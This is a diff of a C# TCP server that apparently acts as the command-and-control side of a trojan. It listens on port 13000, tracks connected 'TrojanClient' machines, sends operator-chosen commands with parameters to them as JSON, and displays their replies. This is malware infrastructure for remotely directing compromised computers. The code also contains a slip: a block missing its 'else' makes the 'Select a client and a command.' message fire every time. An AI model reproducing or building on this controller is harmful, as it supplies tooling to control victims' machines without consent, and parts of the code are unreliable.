@@ -20,24 +20,10 @@ namespace Server.TCP
 
         private const Int32 PORT = 13000;
 
-        //private const String ADDRESS = "127.0.0.1";
-
-        //private IPAddress localAddress;
-
         public TcpListener tcpServer;
 
-        //private static Byte[] bytes;
-
-        //private static String data;
-
-        //static DateTime localDate;
-
-        static CultureInfo cultureInfo;
-
         private static int clientCount = 0;
-
-        //static NetworkStream stream;
-
+        
         private List<TrojanClient>  trojanClients = new List<TrojanClient>();
 
         public TcpServer()
@@ -45,9 +31,6 @@ namespace Server.TCP
             serverGUI = new Window1();
             serverGUI.Show();
             serverGUI.SentPressed += SendMessage;
-
-            //cultureInfo = new CultureInfo(cultureName);
-            cultureInfo = CultureInfo.CurrentCulture;
 
             BackgroundWorker worker1 = new BackgroundWorker();
             worker1.DoWork += new DoWorkEventHandler(Worker1_DoWork);
@@ -60,9 +43,7 @@ namespace Server.TCP
             {
                 serverGUI.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, (ThreadStart)(async delegate ()
                 {
-                    //localAddress = IPAddress.Parse(ADDRESS);
-                    tcpServer = new TcpListener(/*localAddress*/ IPAddress.Any, PORT);
-                    //localDate = DateTime.Now;
+                    tcpServer = new TcpListener(IPAddress.Any, PORT);
                     tcpServer.Start();
                     while (true)
                     {
@@ -90,7 +71,7 @@ namespace Server.TCP
             {
                 serverGUI.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Normal, (ThreadStart)(delegate ()
                 {
-                    serverGUI.SetLabel(ex.Message + "\n");
+                    serverGUI.DisplayOutput(ex.Message + "\n");
                 }));
             }
             finally
@@ -107,7 +88,6 @@ namespace Server.TCP
             await serverGUI.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Normal, (ThreadStart)(async delegate ()
             {
                 var client = (TcpClient)obj;
-                serverGUI.SetLabel("Connected");
                 var bytes = new Byte[256];
                 string data = null;
                 // Get a stream object for reading and writing
@@ -121,13 +101,11 @@ namespace Server.TCP
                     {
                         i = await stream.ReadAsync(bytes, 0, bytes.Length);
                     }
-                    //localDate = DateTime.Now;
 
                     data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                     byte[] msg = null;
 
                     clientCount++;
-
                     msg = System.Text.Encoding.ASCII.GetBytes("ceva");
                     if (stream.CanWrite)
                     {
@@ -141,30 +119,49 @@ namespace Server.TCP
 
         async void SendMessage(object sender, EventArgs e)
         {
-            //var client = (TcpClient)obj;
-            //serverGUI.SetLabel("Connected");
             int clientId = serverGUI.GetClientId();
-            if (clientId >= 0)
+            int commandId = serverGUI.GetCommandId();
+            if (clientId >= 0 && commandId > 0)
             {
-                var client = trojanClients[serverGUI.GetClientId()].Client;
+                var trojanClient = trojanClients[serverGUI.GetClientId()];
+                var client = trojanClient.Client;
                 var bytes = new Byte[256];
+
                 // Get a stream object for reading and writing
+
                 NetworkStream stream = client.GetStream();
                 byte[] msg = null;
-                Command command = new Command(serverGUI.GetCommandId(), serverGUI.GetParameters());
+                Command command = new Command(commandId, serverGUI.GetParameters());
                 string output = JsonConvert.SerializeObject(command);
                 msg = System.Text.Encoding.ASCII.GetBytes(output);
                 if (stream.CanWrite)
                 {
                     await stream.WriteAsync(msg, 0, msg.Length);
                 }
-
-                if (stream.CanRead)
+                try
                 {
-                    await stream.ReadAsync(bytes, 0, bytes.Length);
+                    int i = 0;
+                    if (stream.CanRead)
+                    {
+                        i = await stream.ReadAsync(bytes, 0, bytes.Length);
+                    }
+                    var response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
+                    serverGUI.DisplayOutput(response);
+                } catch
+                {
+                    serverGUI.DisplayOutput("Client does not respond.");
+                    RemoveClient(trojanClient);
                 }
             }
+            {
+                serverGUI.DisplayOutput("Select a client and a command.");
+            }
+        }
 
+        private void RemoveClient(TrojanClient trojanClient)
+        {
+            trojanClients.Remove(trojanClient);
+            serverGUI.SetClients(trojanClients.Select(x => x.Name));
         }
     }
 }
